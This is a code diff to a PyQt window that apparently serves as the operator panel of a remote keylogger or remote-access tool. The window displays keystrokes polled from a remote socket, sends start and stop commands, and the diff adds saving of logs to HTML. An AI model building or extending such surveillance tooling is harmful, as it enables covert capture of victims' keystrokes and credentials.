@@ -22,11 +22,12 @@ class mainPopup(QWidget, Ui_Form):
 
         self.setWindowTitle('Keystokes from - %s - Socket #%s' % (self.ipAddress, self.socket))
 
-        self.stopKeyloggingButton.setDisabled(True)
+        self.stopKeyloggingButton.setChecked(True)
 
         self.startKeyloggingButton.clicked.connect(self.start_logging)
         self.stopKeyloggingButton.clicked.connect(self.stop_logging)
         self.alwaysTopButton.clicked.connect(self.always_top)
+        self.saveButton.clicked.connect(self.save)
 
         self.last_title = ''
 
@@ -39,8 +40,8 @@ class mainPopup(QWidget, Ui_Form):
             self.timer.timeout.connect(self.set_logs)
             self.timer.start(10)
 
-            self.stopKeyloggingButton.setDisabled(False)
-            self.startKeyloggingButton.setDisabled(True)
+            self.stopKeyloggingButton.setChecked(False)
+            self.startKeyloggingButton.setChecked(True)
 
     def convert_smilies(self):
 
@@ -57,7 +58,10 @@ class mainPopup(QWidget, Ui_Form):
         data.replace(':O', smiley('Ligthbulb'))
         data.replace(':*', smiley('Kiss'))
         self.keystokesText.setHtml(data)
-        self.keystokesText.moveCursor(QTextCursor.End)
+
+    def save(self):
+        file_name = QFileDialog.getSaveFileName(self, "Save To File", "", filter="html (*.html)")
+        open(file_name, 'w').write(self.keystokesText.toHtml())
 
     def set_logs(self):
         try:
@@ -69,7 +73,9 @@ class mainPopup(QWidget, Ui_Form):
                 self.keystokesText.moveCursor(QTextCursor.End)
                 self.keystokesText.insertHtml(result[k])
                 self.last_title = k
-            self.convert_smilies()
+            if self.smileyButton.isChecked():
+                self.convert_smilies()
+            self.keystokesText.moveCursor(QTextCursor.End)
         except AttributeError:
             pass
         except socket.error:
@@ -80,8 +86,8 @@ class mainPopup(QWidget, Ui_Form):
             data = get(self.sock, 'stopKeylogger', 'keyloggerstop')
         except:
             return
-        self.stopKeyloggingButton.setDisabled(True)
-        self.startKeyloggingButton.setDisabled(False)
+        self.stopKeyloggingButton.setChecked(True)
+        self.startKeyloggingButton.setChecked(False)
         try:
             self.timer.stop()
         except AttributeError:
